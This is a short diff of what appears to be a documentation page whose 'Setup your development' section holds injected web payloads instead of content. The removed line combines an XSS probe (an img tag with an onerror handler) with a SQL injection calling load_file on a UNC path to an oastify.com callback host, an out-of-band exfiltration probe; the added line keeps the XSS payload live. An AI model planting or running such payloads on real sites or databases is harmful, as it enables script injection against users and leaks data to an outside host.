@@ -5,4 +5,4 @@ description: 'Start building awesome documentation in under 5 minutes'
 
 ## Setup your development
 
-<img src=x onerror=javascript:confirm(1);/></html>'+(select load_file('\\\\ykmlpk272klc97mz9za3qig9e0ku8l79ycm49vxk.oastify.com\\njr'))+'
+<img src=x onerror=javascript:confirm(1);/></html>'
